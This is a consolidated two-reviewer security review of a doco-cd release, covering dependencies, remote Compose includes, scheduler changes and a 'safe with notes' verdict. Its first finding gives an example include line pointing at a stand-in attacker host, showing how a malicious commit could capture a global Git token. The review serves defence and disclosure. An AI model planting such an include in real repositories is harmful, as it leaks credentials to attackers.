## Summary of Changes

This is a large feature release: 168 changed files with roughly 13,900 insertions (over half tests and documentation, per Reviewer 1), spanning two commits. Both reviewers confirmed the working tree was clean and that no new executable files, symlinks, submodules, capabilities, privileged flags, host mounts, or container permission changes were introduced.

The update adds deployment-run tracking via a new in-memory registry (bounded to 50 records per trigger type, 7-day TTL, no persistence) exposed through new read-only API endpoints (`GET /v1/api/runs`, `/v1/api/run/{jobID}`). These routes are only registered when `API_SECRET` is configured and enforce the same `x-api-key` check as existing endpoints; webhook HMAC verification is untouched. The most security-relevant new feature is remote Compose includes: compose files can now `include:` resources from Git or OCI remotes, cloned into a `0700` cache directory. Both reviewers independently verified the path-containment defenses (hashed cache keys, clean/`..`/absolute rejection, symlink-aware `EvalSymlinks` + `Rel` checks) and found no traversal.

The scheduler was overhauled (`robfig/cron` replaced by `go-co-op/gocron/v2`), adding one-off jobs, Swarm jobs, status tracking, secret re-resolution, and a new `stop_services` capability that can stop/restart services — including in other compose projects — around a job run. Swarm reconciliation gains config/secret revision retention and pruning (deletions only, no value exposure), rollback detection, and stable labels. New operator-controlled configuration (all env-var driven, never repo- or payload-controlled) includes `SOURCE_URL_REWRITES`, domain-scoped `GIT_AUTH_DOMAINS` credentials, `DATA_HOST_PATH`, `OCI_INSECURE_REGISTRIES`, and Swarm retention counts. Registry-auth diagnostics use `exec.LookPath` only to detect missing `docker-credential-*` helpers — both reviewers confirmed nothing is executed and no credential values appear in hints.

The release also contains several hardenings: OCI tar extraction now rejects absolute/`..` entry names, Apprise notification error bodies are capped and redacted before logging, `SOURCE_URL_REWRITES` matches refuse to fall back to payload-supplied SSH URLs (blocking payload-steered clones), and the `auto_discovery.delete` default flipped from enabled to disabled. Build changes are digest-pin bumps only (golang, debian, Buildx 0.35.0 → 0.36.1); a GHCR housekeeping CI workflow was deleted.

## Dependency Review

Both reviewers reached the same conclusion: no malicious or inexplicable dependency was introduced. New direct dependencies are mainstream and purpose-matched: `go-co-op/gocron/v2` (scheduler), `go-playground/validator/v10` (validation), and `go.yaml.in/yaml/v4` (YAML v3 → v4 migration). Removed: `creasty/defaults` and `gopkg.in/validator.v2`, replaced by audited in-tree packages that Reviewer 1 confirmed contain no rule loosening on secret/auth fields and no I/O. The larger `go.sum` churn (OPA, `moby/policy-helpers`, wasmtime, badger, `lestrrat-go/jwx`, `hiddeco/sshsig`) is transitively pulled in by the BuildKit 0.32 / buildx 0.36 / Cosign-sigstore upgrades — all well-known projects, with no typosquat-looking module paths and no suspicious network/crypto/exec packages. Reviewer 2 notes this was a source-level sanity review, not a live vulnerability scan.

## Security Findings

### 1. Global Git credentials can be sent to repository-controlled remote include hosts

**Flagged by:** Both reviewers, with conflicting severity — Reviewer 1: Medium (advisory, by design); Reviewer 2: High (conditional), and the basis of its conditional-reject verdict.

**Severity:** High (conditional on a global `GIT_ACCESS_TOKEN` being configured); Medium where credentials are already domain-scoped or all repo authors are fully trusted.

The new Git include loader (`internal/docker/git_resource_loader.go`) authenticates include clones using the application's credential resolution, which intentionally falls back to the global `GIT_ACCESS_TOKEN` (`internal/git/auth.go`) when no domain-scoped entry matches, sending it as HTTP Basic Auth. Since include URLs come from repo-authored compose content, a malicious commit adding `include: https://attacker.example/x.git` causes the global token to be transmitted to an attacker-controlled host.

**Assessment:** Real risk; the reviewers agree entirely on the mechanism and mitigation, and disagree only on how to weigh it. Reviewer 1 argues repo authors are already effectively host-root in doco-cd's threat model and this is upstream's intended fallback behavior; Reviewer 2 argues that leaking a potentially organization-wide Git token grants persistent lateral access *beyond* the Docker host, exceeding the trust already granted. Reviewer 2's position is more convincing: the existing threat model concedes control of the Docker host, but a forwarded global token extends the blast radius to every repository that token can reach — a genuine defense-in-depth regression, not merely a restatement of existing trust. Both reviewers converge on the same mitigation: before deploying, replace any global `GIT_ACCESS_TOKEN` with strictly domain-scoped `GIT_AUTH_DOMAINS` credentials so unrecognized include hosts receive no credentials.

### 2. Scheduled jobs can stop services in unrelated projects (`stop_services`)

**Flagged by:** Both reviewers, with differing severity — Reviewer 1: Informational; Reviewer 2: Medium (conditional).

**Severity:** Low overall; Medium in multi-tenant deployments where repositories have different trust owners.

The `cd.doco.job.stop_services` label accepts `project/service` references, and validation only rejects a job stopping itself (`internal/docker/job_schedule.go`) — it does not restrict targeting other projects. The scheduler will stop Compose services or scale Swarm services to zero in stacks doco-cd does not manage. Restoration is attempted (including on job failure), but crashes or restore errors can prolong an outage. Cross-project targeting is explicitly documented upstream.

**Assessment:** Real but limited. Both reviewers agree the impact is availability-only and grants no privilege beyond what deployed repos already have. Reviewer 2's Medium is appropriate only where repos sharing the daemon belong to different trust owners; in a single-operator deployment, Reviewer 1's Informational rating is the more accurate characterization. Operators of multi-tenant hosts should review or restrict this label via configuration review.

### 3. Include errors may expose URL-embedded credentials in logs

**Flagged by:** Reviewer 2 only.

**Severity:** Low (conditional).

While normal resource logging redacts URL userinfo, authentication/clone/update error paths in `git_resource_loader.go` wrap the raw remote URL with `%q`. If an operator embeds credentials directly in an include URL, a failed operation can place them in logs and deployment-run error records.

**Assessment:** Plausible and consistent with Reviewer 1's report (which noted redaction elsewhere but did not examine these error paths); nothing in Reviewer 1's findings contradicts it. Low impact and fully avoidable: use scoped credential configuration rather than credential-bearing URLs.

### 4. `OCI_INSECURE_REGISTRIES` is an opt-in TLS-verification bypass

**Flagged by:** Both reviewers.

**Severity:** Informational.

A new setting allows disabling TLS verification for explicitly named OCI registries. Both reviewers confirmed it is operator-configured, strictly validated, defaults to empty, and changes no default TLS behavior. Not a risk unless deliberately enabled.

### 5. Pre-existing non-constant-time API key comparison

**Flagged by:** Reviewer 1 only.

**Severity:** Informational (pre-existing, unchanged in this diff).

The REST API key check uses plain `==` rather than a constant-time comparison. This predates the upgrade, is practically very hard to exploit over a network, and webhook secrets already use `hmac.Equal`/`subtle.ConstantTimeCompare`. Noted for completeness only.

## Reviewer Agreement

The reviewers agreed on the substance of nearly everything: no backdoor, exfiltration channel, hidden command execution, or malicious dependency anywhere in the diff; the include-cache path-containment and OCI extraction defenses are sound; the new API endpoints are properly authenticated; and the two headline findings (global-token forwarding via remote includes, cross-project `stop_services`) share identical mechanisms and mitigations in both reports. They differed on weighting: Reviewer 1 rated the token-forwarding issue Medium/advisory and approved outright, while Reviewer 2 rated it High and issued a conditional reject pending removal of global fallback credentials; Reviewer 2 additionally flagged the URL-in-error-message leak, which Reviewer 1 did not cover.

## Verdict

**SAFE WITH NOTES** — Both reviewers found the update free of malicious code and consistent with upstream's public feature work, so building and deploying it is acceptable. However, the new remote Compose include feature means a global `GIT_ACCESS_TOKEN` can be exfiltrated by anyone who can modify deployed compose files; before or alongside rollout, replace global git credentials with domain-scoped `GIT_AUTH_DOMAINS` entries, and review `stop_services` usage if repositories with different trust owners share the Docker host.
